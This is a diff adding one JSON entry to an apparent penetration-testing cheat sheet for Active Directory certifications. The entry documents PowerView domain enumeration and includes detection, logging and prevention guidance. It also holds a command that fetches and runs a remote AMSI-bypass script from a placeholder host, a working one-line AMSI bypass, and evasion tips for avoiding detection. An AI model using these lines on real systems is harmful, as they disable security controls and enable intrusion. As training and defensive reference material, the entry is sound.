@@ -1,0 +1,114 @@
+{
+  "id": "crtp-powerview-domain",
+  "name": "PowerView Domain Enumeration",
+  "command": "Get-Domain -Domain <domain>",
+  "description": "Enumerate domain, forest, DCs, and functional levels using PowerView from an authenticated Windows session.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Domain Enumeration",
+  "type": "command",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "source": "CRTP",
+  "opsec": "quiet",
+  "mitre": [
+    "T1482",
+    "T1069.002"
+  ],
+  "tools": [
+    "PowerView"
+  ],
+  "tags": [
+    "powerview",
+    "domain",
+    "enumeration",
+    "ad"
+  ],
+  "steps": [
+    {
+      "label": "Load PowerView",
+      "command": ". C:\\Tools\\PowerView.ps1"
+    },
+    {
+      "label": "Get domain info",
+      "command": "Get-Domain -Domain <domain>"
+    },
+    {
+      "label": "Get DCs",
+      "command": "Get-DomainController -Domain <domain>"
+    },
+    {
+      "label": "Get forest info",
+      "command": "Get-Forest"
+    },
+    {
+      "label": "Get domain SID",
+      "command": "Get-DomainSID"
+    }
+  ],
+  "examples": [
+    {
+      "label": "Get current domain",
+      "command": "Get-Domain"
+    },
+    {
+      "label": "List all DCs with IPs",
+      "command": "Get-DomainController | select Name,IPAddress,OSVersion"
+    },
+    {
+      "label": "Get domain SID",
+      "command": "Get-DomainSID"
+    },
+    {
+      "label": "Get forest domains",
+      "command": "Get-ForestDomain | select Name,DomainSID"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-powerview-users-groups",
+      "note": "Enumerate users and groups",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-powerview-acls",
+      "note": "Find ACL misconfigurations",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-bloodhound",
+      "note": "Graph full attack paths via BloodHound",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-powerview-trusts",
+      "note": "Map domain and forest trusts",
+      "rel": "next"
+    }
+  ],
+  "notes": "Bypass AMSI before loading: iex (iwr http://<lhost>/amsi-bypass.ps1 -UseBasicParsing)",
+  "references": [
+    {
+      "title": "CRTP - PowerView Domain Enum",
+      "url": "https://www.alteredsecurity.com/adlab"
+    }
+  ],
+  "defense": {
+    "why_it_works": "PowerView wraps .NET ADSI/LDAP calls in PowerShell. Get-Domain, Get-DomainController, Get-DomainSID pull core domain metadata. Runs under current user token \u2014 no admin needed. Pure PowerShell historically evaded AV/EDR (AMSI bypass required on modern systems).",
+    "prerequisites": "Any domain user. PowerView.ps1 loaded in-memory or from disk. PowerShell execution. LDAP access to DC.",
+    "impact": "T1482 Domain Trust Discovery + T1069.002 Permission Groups Discovery. Reveals domain SID, forest structure, DC list, functional level \u2014 foundational data for privilege escalation path planning.",
+    "detection": "PowerShell Script Block Logging (Event 4104): distinctive PowerView function names. AMSI signatures for known PowerView strings. MDI LDAP reconnaissance alert.\nAdversary uses nltest, PowerShell, or Win32/.NET API to enumerate domain trust relationships (via DSEnumerateDomainTrusts, GetAllTrustRelationships, or LDAP queries), followed by discovery or authentication staging (DET0007/AN0016).\nDetection of adversary enumeration of domain or local group memberships via native tools such as net.exe, PowerShell, or WMI; may precede lateral movement or privilege escalation (DET0179/AN0507).\nGroup enumeration using 'id', 'groups', or 'getent group' commands on Linux, often followed by privilege escalation or SSH lateral movement (AN0508).\nGroup membership checks via 'dscl', 'dscacheutil', or 'id' on macOS, executed via terminal or automation scripts (AN0509).",
+    "artifacts": "Event 4104: Get-Domain / Get-DomainController / PowerView functions | AMSI blocked event if not bypassed | MDI LDAP reconnaissance alert | Sysmon Event 7: PowerView.ps1 loaded",
+    "prevention": "PowerShell CLM (WDAC/AppLocker). Script Block Logging + Module Logging via GPO. AMSI enforcement. MDI deployment. Restrict LDAP from workstations.\nAudit: Map the trusts within existing domains/forests and keep trust relationships to a minimum.\nNetwork Segmentation: Employ network segmentation for sensitive domains.\nThis technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features.",
+    "evasion": "Obfuscate function names (Invoke-Obfuscation). Load in-memory via IEX(iwr ...). Bypass AMSI before loading. Use ADSI calls directly to avoid PowerView string signatures.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1482/",
+      "https://attack.mitre.org/techniques/T1069/002/"
+    ],
+    "misconfiguration": "Script Block Logging disabled. AMSI not enforced/updated. CLM not applied to workstations. MDI absent.",
+    "vulnerable_config": "# Script Block Logging disabled:\n# HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\n# EnableScriptBlockLogging = 0 (or key absent)\n\n# AMSI bypass succeeds \u2014 not patched:\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+    "secure_config": "# Enable Script Block Logging via GPO:\n# Computer Config \u2192 Admin Templates \u2192 Windows Components \u2192 Windows PowerShell\n# \u2192 Turn on Script Block Logging: Enabled\n\n# WDAC AllowMicrosoft policy \u2192 CLM on non-admin hosts\n\n# SIEM alert on PowerView function names in Event 4104:\n# EventID=4104 AND ScriptBlockText contains ('Get-DomainController' OR 'Get-NetGPO')"
+  }
+}
